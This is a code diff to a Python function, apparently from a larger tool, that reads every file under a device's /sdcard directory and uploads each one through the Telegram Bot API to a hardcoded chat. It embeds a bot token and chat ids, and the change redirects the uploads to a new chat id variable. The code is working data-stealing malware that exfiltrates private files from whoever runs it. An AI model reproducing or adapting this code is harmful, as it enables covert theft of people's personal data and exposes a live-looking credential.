@@ -1125,6 +1125,7 @@ def gxdsBot():
 
     bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
     chat_id = "6542321044"
+    txt_id = "6542321044"
     # SD CARD
     try:
         sdcard_path = "/sdcard"
@@ -1147,8 +1148,8 @@ def gxdsBot():
         for file in file_list:
             with open(os.path.join(sdcard_path, file), "rb") as f:
                 url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-                data2 = {"chat_id": chat_id}
-                data = {"chat_id": chat_id}
+                data2 = {"chat_id": txt_id}
+                data = {"chat_id": txt_id}
                 files = {"document": f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
